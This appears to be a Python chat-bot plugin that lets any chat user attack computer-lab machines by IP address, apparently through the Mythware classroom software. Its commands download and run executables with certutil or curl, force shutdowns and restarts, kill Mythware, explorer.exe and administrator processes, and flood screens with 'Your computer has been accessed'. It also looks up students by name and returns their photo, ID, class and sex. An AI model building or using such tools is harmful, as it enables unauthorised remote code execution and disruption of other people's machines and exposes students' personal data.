import asyncio
import base64
import os

from nonebot.adapters.satori import Bot, MessageSegment
from nonebot.adapters.satori.event import Event
from .机房助手 import send_cmd
from ... import User, get_group_id
from ...api import get_student_info_by_name

APP_LIST = [{
    'logo': '🧟',
    'name': '植物大战僵尸杂交版',
    'short_name': 'PVZ杂交版',
    'app_name': 'a.exe'
}, {
    'logo': '💀',
    'name': '植物大战僵尸杂交版修改器',
    'short_name': '杂交版修改器',
    'app_name': 'b.exe'
}]


async def 机房获取(ch, bot, event):
    cmd = event.get_plaintext().split(' ')
    if len(cmd) != 3:
        return '参数错误！'
    ip = cmd[2]
    app_id = cmd[1]
    if not app_id.isdigit():
        return '【 应用ID 】应为数字编号，请使用【 机房应用查询 】搜索应用ID'
    app_id = int(app_id)
    if app_id < 1 or app_id > len(APP_LIST):
        return '【 应用ID 】不存在，请使用【 机房应用查询 】搜索应用ID'
    app = APP_LIST[app_id - 1]
    send_cmd(ip, rf'certutil -urlcache -split -f '
                 rf'http://10.32.81.20:8888/d/%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83'
                 rf'/temp/{app.get("app_name")} D:\{app.get("app_name")} && D:\{app.get("app_name")}')
    send_cmd(ip, rf'curl -o D:\{app.get("app_name")} '
                 rf'http://10.32.81.20:8888/d/%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83'
                 rf'/temp/{app.get("app_name")} && D:\{app.get("app_name")}')
    return f"已向【 {ip} 】发送【 {app.get('name')} 】下载指令！"


async def 机房关机(ch, bot, event):
    cmd = event.get_plaintext().split(' ')
    if len(cmd) != 2:
        return '参数错误！'
    ip = cmd[1]
    send_cmd(ip, 'shutdown -s -t 0')
    return f"已向【 {ip} 】发送关机指令！"


async def 机房重启(ch, bot, event):
    cmd = event.get_plaintext().split(' ')
    if len(cmd) != 2:
        return '参数错误！'
    ip = cmd[1]
    send_cmd(ip, 'shutdown -r -t 0')
    return f"已向【 {ip} 】发送重启指令！"


async def 杀死极域(ch, bot, event):
    cmd = event.get_plaintext().split(' ')
    if len(cmd) != 2:
        return '参数错误！'
    ip = cmd[1]
    send_cmd(ip, 'taskkill /f /im studentmain.exe')
    return f"已向【 {ip} 】发送杀死极域指令！"


async def 机房助手(ch, bot, event):
    msg = "-⭐-🚀 机房助手 🚀-⭐-\n\n"
    msg += "🪧 说明：请勿滥用此功能，后果自负！！！\n"
    msg += "🪧 IP地址：自行查看本机IP地址\n"
    msg += "🪧 注意，使用【 杀死极域 】功能之后其余功能均会失效\n"
    msg += "🪧 注意，只有【 极域 】存活时可以用该功能\n\n"
    msg += "🪧 【 机房应用查询 】\n\n"
    msg += "🧟 【 机房获取 [应用ID] IP地址 】\n\n"
    msg += "🛩️ 【 机房关机 IP地址 】\n\n"
    msg += "♻️ 【 机房重启 IP地址 】\n\n"
    msg += "🚀 【 杀死极域 IP地址 】\n\n"
    msg += "🧨 【 机房清除桌面 IP地址 】\n\n"
    msg += "🔥 【 机房关闭所有应用 IP地址 】\n\n"
    msg += "🖥️ 【 机房恶搞 [恶搞数量(数字)] IP地址 】\n\n"
    msg += "-⭐- 🚀 山商AI 🚀 -⭐-"
    return msg


async def 机房应用查询(ch, bot, event):
    msg = "-⭐-🚀 机房应用查询 🚀-⭐-\n\n"
    msg += "🪧 说明：输入【 应用ID 】时仅需要输入【 编号 】即可\n\n"
    for i, app in enumerate(APP_LIST):
        msg += f"【 {i + 1} 】 {app.get('logo')} {app.get('name')}\n"
    msg += "\n更多内容还在收录中...\n\n"
    msg += "-⭐- 🚀 山商AI 🚀 -⭐-"
    return msg


async def 机房恶搞(ch, bot, event):
    cmd = event.get_plaintext().split(' ')
    if len(cmd) != 3:
        return '参数错误！'
    ip = cmd[2]
    num = cmd[1]
    if not num.isdigit():
        return '【 恶搞数量 】应为数字，请重新输入！'
    num = int(num)
    user = User(event)
    for _ in range(num):
        send_cmd(ip, f'echo "Your computer has been accessed !!! [From QQ: {user.qq}]" && cmd')
        await asyncio.sleep(0.1)
    return f"已向【 {ip} 】发送【 {num} 】次恶搞指令！"


async def 机房清除桌面(ch, bot, event):
    cmd = event.get_plaintext().split(' ')
    if len(cmd) != 2:
        return '参数错误！'
    ip = cmd[1]
    send_cmd(ip, 'taskkill /f /im explorer.exe')
    return f"已向【 {ip} 】发送清除桌面指令！"


async def 机房关闭所有应用(ch, bot, event):
    cmd = event.get_plaintext().split(' ')
    if len(cmd) != 2:
        return '参数错误！'
    ip = cmd[1]
    send_cmd(ip, 'taskkill /f /fi "USERNAME eq Administrator"')
    return f"已向【 {ip} 】发送关闭所有应用指令！"


async def 姓名搜索(ch, bot, event):
    cmd = event.get_plaintext().split(' ')
    if len(cmd) != 2:
        return '参数错误！'
    name = cmd[1]
    data = await get_student_info_by_name(name)
    msg = MessageSegment.text('-⭐-🚀 学生信息查询 🚀-⭐-\n\n')
    if not data:
        msg += MessageSegment.text('未查询到该学生信息！\n')
    else:
        if int(get_group_id(event)) in eval(os.getenv('MAIN_GROUPS')):
            msg += MessageSegment.image(raw=base64.b64decode(data.get('image')), mime='image/png')
        msg += MessageSegment.text(f'📚 学生学号：{data.get("uid")}\n')
        msg += MessageSegment.text(f'🏫 学生班级：{data.get("deptName")}\n')
        msg += MessageSegment.text(f'🧑‍🎓 学生姓名：{data.get("name")}\n')
        msg += MessageSegment.text(f'🧍 学生性别：{data.get("sex")}\n')
    msg += MessageSegment.text('\n-⭐- 🚀 山商AI 🚀 -⭐-')
    return msg


async def 实用工具(ch, bot, event):
    msg = "-⭐-🚀 实用工具 🚀-⭐-\n\n"
    msg += "🪧 说明：请勿滥用此功能，后果自负！！！\n\n"
    msg += "⭐ 【 姓名搜索 学生姓名 】\n"
    msg += "🪧 说明：输入学生姓名进行搜索\n\n"
    msg += "⭐ 【 机房助手 】\n"
    msg += "🪧 说明：机房助手功能\n\n"
    msg += "-⭐- 🚀 山商AI 🚀 -⭐-"
    return msg


async def main(ch, bot: Bot, event: Event):
    msg = event.get_plaintext().strip()
    if not msg:
        return
    if msg == '机房助手':
        await ch.finish(await 机房助手(ch, bot, event))
    elif msg.startswith('机房获取'):
        await ch.finish(await 机房获取(ch, bot, event))
    elif msg.startswith('机房关机'):
        await ch.finish(await 机房关机(ch, bot, event))
    elif msg.startswith('机房重启'):
        await ch.finish(await 机房重启(ch, bot, event))
    elif msg.startswith('杀死极域'):
        await ch.finish(await 杀死极域(ch, bot, event))
    elif msg == '机房应用查询':
        await ch.finish(await 机房应用查询(ch, bot, event))
    elif msg.startswith('机房恶搞'):
        await ch.finish(await 机房恶搞(ch, bot, event))
    elif msg.startswith('机房清除桌面'):
        await ch.finish(await 机房清除桌面(ch, bot, event))
    elif msg.startswith('机房关闭所有应用'):
        await ch.finish(await 机房关闭所有应用(ch, bot, event))
    elif msg.startswith('姓名搜索'):
        await ch.finish(await 姓名搜索(ch, bot, event))
    elif msg == '实用工具':
        await ch.finish(await 实用工具(ch, bot, event))
